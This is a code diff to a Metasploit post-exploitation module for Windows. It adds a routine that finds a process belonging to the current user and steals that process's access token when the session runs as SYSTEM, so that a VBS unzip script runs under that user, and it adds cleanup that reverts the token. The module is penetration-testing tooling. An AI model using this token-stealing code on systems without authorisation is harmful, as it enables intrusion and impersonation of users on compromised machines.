@@ -8,6 +8,7 @@ require 'msf/core'
 class MetasploitModule < Msf::Post
 
   include Msf::Post::File
+  include Msf::Post::Windows::Priv
 
   def initialize(info={})
     super(update_info(info,
@@ -44,7 +45,48 @@ class MetasploitModule < Msf::Post
     vbs_file
   end
 
+  def find_pid_by_user(username)
+    computer_name = get_env('COMPUTERNAME')
+    print_status("Searching for PID for #{computer_name}\\\\#{username}")
+    session.sys.process.processes.each do |p|
+      if p['user'] == "#{computer_name}\\#{username}"
+        return p['pid']
+      end
+    end
+
+    nil
+  end
+
+  def steal_token
+    current_user = get_env('USERNAME')
+    pid = find_pid_by_user(current_user)
+
+    unless pid
+      fail_with(Failure::Unknown, "Unable to find a PID for #{current_user} to execute .vbs")
+    end
+
+    print_status("Stealing token from PID #{pid} for #{current_user}")
+    begin
+      session.sys.config.steal_token(pid)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      # It could raise an exception even when the token is successfully stolen,
+      # so we will just log the exception and move on.
+      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
+    end
+
+    @token_stolen = true
+  end
+
   def upload_exec_vbs_zip
+    if is_system?
+      unless session
+        print_error('Unable to decompress with VBS technique without Meterpreter')
+        return
+      end
+
+      steal_token
+    end
+
     script = vbs(datastore['DESTINATION'], datastore['SOURCE'])
     tmp_path = "#{get_env('TEMP')}\\zip.vbs"
     print_status("VBS file uploaded to #{tmp_path}")
@@ -78,7 +120,18 @@ class MetasploitModule < Msf::Post
     do_zip
   end
 
+  def cleanup
+    if @token_stolen && session
+      session.sys.config.revert_to_self
+      print_status('Token restored.')
+    end
+
+    super
+  end
+
   def run
+    @token_stolen = false
+
     os = get_target_os
     case os
     when Msf::Module::Platform::Windows.realname.downcase
